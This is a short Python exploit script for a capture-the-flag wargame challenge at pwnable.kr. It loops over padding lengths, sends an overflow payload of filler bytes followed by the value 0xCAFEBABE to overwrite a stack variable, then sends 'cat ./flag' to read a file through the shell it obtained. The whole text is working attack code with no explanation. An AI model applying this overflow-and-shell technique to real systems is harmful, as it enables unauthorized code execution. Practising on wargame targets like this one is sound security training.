import socket, sys

for i in range(32, 100):
    print(i)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect(('pwnable.kr', 9000))
    server.send(i * 'X' + '\xBE\xBA\xFE\xCA' + '\n')
    server.send('cat ./flag' + '\n')
    response = server.recv(4096).strip()
    print(response)


